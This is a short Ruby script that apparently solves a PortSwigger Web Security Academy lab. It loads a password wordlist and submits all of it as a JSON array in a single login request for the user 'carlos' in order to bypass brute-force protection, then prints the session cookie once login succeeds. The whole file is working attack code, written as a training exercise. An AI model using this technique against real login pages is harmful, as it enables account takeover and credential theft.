require 'http'

url = "https://0a8b00d9040f14b281464e8400a100bc.web-security-academy.net/login"
pass = []
fh = File.new "passwd.txt","r"
temp_pass = fh.readlines
fh.close

temp_pass.each {|d| pass << d.chomp }

client = HTTP.cookies(:session=>"2c8ziZ1wHR8phrXyz1P99qN2nhW1qfOB").post(url,:json => {:username=>"carlos",:password=>pass})

if client.code==302
	puts "Logged in as carlos"
	puts client.headers['Set-Cookie']
end
